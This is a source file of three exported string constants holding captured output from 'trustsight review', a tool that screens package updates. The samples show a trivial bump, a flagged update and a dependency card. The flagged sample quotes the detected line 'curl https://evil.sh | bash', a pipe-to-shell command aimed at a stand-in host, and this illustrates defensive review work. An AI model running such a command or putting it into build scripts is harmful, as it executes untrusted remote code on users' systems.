// Exact output of `trustsight review` (default flags, no `--score`), captured
// from the tool's own renderer (src/trustsight/cli/review.py,
// _render_results_rich) at COLUMNS=70, ANSI codes stripped. Three outdated
// packages: a trivial bump, a flagged update, and one with a dependency
// mini-card. Not hand-typed.

export const plateExample = `╭───────────────────────── chez-scheme-bin ──────────────────────────╮
│  Version  10.0.0  →  10.1.0                                        │
│  Status   Only pkgver and sha256sums changed. Review the diff      │
│           before building.                                         │
│  Changed  pkgver 10.0.0 -> 10.1.0                                  │
│           checksums checksum added or changed                      │
╰────────────────────────────────────────────────────────────────────╯`

export const plateFlagged = `╭─────────────────────────── sketchy-pkg ────────────────────────────╮
│  Version  1.4.2  →  1.5.0                                          │
│  Status   The update is not trivial. Review it.                    │
│           PKGBUILD line 4 [R001]  Remote Script Execution: curl    │
│           https://evil.sh | bash [R001]                            │
│            [SOURCE_BUCKET]  Source URL classified as unknown       │
│           (https://evil.sh)                                        │
│  Changed  source host added: evil.sh                               │
╰────────────────────────────────────────────────────────────────────╯`

export const plateDeps = `╭──────────────────────── some-trusted-tool ─────────────────────────╮
│  Version       2.4.1  →  2.4.2                                     │
│  Status        The update is not trivial. Review it.               │
│                                                                    │
│  Dependencies                                                      │
│                ╭────────── L1  libhelper ──────────╮               │
│                │ Findings 2                        │               │
│                │     Risk (High)                   │               │
│                ╰───────────────────────────────────╯               │
╰────────────────────────────────────────────────────────────────────╯`
